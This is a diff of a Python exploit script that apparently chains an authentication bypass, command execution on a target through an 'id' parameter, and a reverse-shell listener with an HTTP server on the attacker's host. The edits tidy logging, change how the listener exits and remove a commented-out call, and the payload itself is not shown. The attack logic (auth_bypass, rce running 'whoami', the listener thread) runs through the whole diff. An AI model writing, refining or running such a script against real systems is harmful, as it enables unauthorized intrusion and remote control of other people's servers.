@@ -103,7 +103,8 @@ def _interact(conn):
             if not cmd.strip():
                 continue
             if cmd.strip().lower() in ("exit", "quit"):
-                break
+                log.failure("[listener] Exiting listener")
+                sys.exit(1)
 
             conn.sendall((cmd + "\n").encode())
 
@@ -189,7 +190,7 @@ def auth_bypass(session, target):
 
     r = session.get(url, data=data, allow_redirects=False)
 
-    log.info(f"[step 1] {r.request.method} {url} -> {YELLOW}{r.status_code}{NC}")
+    log.info(f"[step 1] {r.request.method} {r.request.url} -> {YELLOW}{r.status_code}{NC}")
     log.debug(f"[step 1] Response:\n {r.text[:200]}")
 
     if r.status_code in (200, 301, 302) or "home" in r.text.lower(): # The string 'home' is a placeholder, change it
@@ -211,7 +212,7 @@ def rce(session, cookies, target, cmd):
     r = session.get(f"{url}", params={"id": payload}, cookies=cookies)
     out = r.text
 
-    log.info(f"[step 2] {r.request.method} {url} -> {YELLOW}{r.status_code}{NC}")
+    log.info(f"[step 2] {r.request.method} {r.request.url} -> {YELLOW}{r.status_code}{NC}")
     log.debug(f"[step 2] Response:\n {r.text[:200]}")
 
     if r.status_code in (400, 404, 500) or "error" in r.text.lower(): # The string 'home' is a placeholder, change it
@@ -252,8 +253,8 @@ def main():
     target  = args.target.rstrip("/") # Remove final slash (/)
 
     log.info(f"Target: {target}")
-    log.info(f"Reverse Shell address: {args.lhost}:{args.lport}")
-    log.info(f"HTTP Server: {args.lhost}:{args.wport}")
+    log.info(f"Listener: {args.lhost}:{args.lport}")
+    log.info(f"HTTP Server: http://{args.lhost}:{args.wport}")
     log.info(f"Proxy: {session.proxies if args.proxy else 'None'}")
     print("───────────────────────────────────────────────────────────────────────")
 
@@ -267,7 +268,6 @@ def main():
     rce(session, cookies, target, "whoami")
 
     # Start listener in background
-    #start_listener("0.0.0.0", args.lport)
     thread = threading.Thread(target=start_listener, args=("0.0.0.0", args.lport), daemon=True)
     thread.start()
 
